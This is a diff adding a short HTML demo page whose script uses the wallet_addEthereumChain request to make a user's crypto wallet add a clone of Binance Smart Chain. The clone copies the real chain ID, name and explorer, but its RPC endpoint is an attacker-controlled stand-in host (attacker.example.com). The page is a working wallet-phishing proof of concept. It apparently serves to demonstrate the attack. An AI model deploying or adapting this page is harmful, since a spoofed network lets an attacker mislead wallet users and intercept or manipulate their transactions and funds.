@@ -1,0 +1,38 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Fake Network Add Demo</title>
+</head>
+<body>
+  <h1>Fake Network Add / Switch</h1>
+  <p>Click the button — the wallet will prompt you to add a "Binance Smart Chain" clone, but RPC is attacker controlled.</p>
+  <button id="addNet">Add Fake BSC</button>
+
+<script>
+  document.getElementById("addNet").onclick = async () => {
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: "0x38", // same as real BSC
+            chainName: "Binance Smart Chain", // looks legit
+            nativeCurrency: {
+              name: "Binance Coin",
+              symbol: "BNB",
+              decimals: 18
+            },
+            rpcUrls: ["https://attacker.example.com/rpc"], // attacker-controlled RPC
+            blockExplorerUrls: ["https://bscscan.com"]
+          }]
+        });
+      } catch (err) {
+        console.error("User rejected", err);
+      }
+    } else {
+      alert("No wallet found");
+    }
+  };
+</script>
+</body>
+</html>
